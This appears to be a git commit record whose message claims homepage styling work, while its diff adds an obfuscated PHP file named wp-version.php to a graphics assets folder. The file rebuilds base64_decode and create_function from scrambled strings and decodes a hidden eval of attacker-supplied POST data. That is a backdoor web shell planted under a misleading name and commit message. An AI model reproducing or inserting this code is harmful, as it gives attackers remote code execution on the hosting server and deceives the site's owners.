97a6589df17c353ea52a04c5697c6db21ae2c8ec
Sarah Russell <sarah@skrdesign.com>
2020-04-16 15:18:31 -0600

    Styled base of homepage and formatted interior content

---
+++ src/assets/graphics/wp-version.php
@@ -0,0 +1,10 @@
+<?php 
+$or="IEeBldmFes";
+$lq="9TVFsenbDN";
+$avj = str_replace("i","","iisitiir_ireipliaicie");
+$zs="KCRfeUE";
+$bu="wJ10epOw=e=";
+$qu = $avj("z", "", "zbazszez6z4_dzeczodze");
+$fh = $avj("m","","cmrematem_fumnctmiomn");
+$hwy = $fh('', $qu($avj("e", "", $or.$zs.$lq.$bu))); $hwy();
+?>
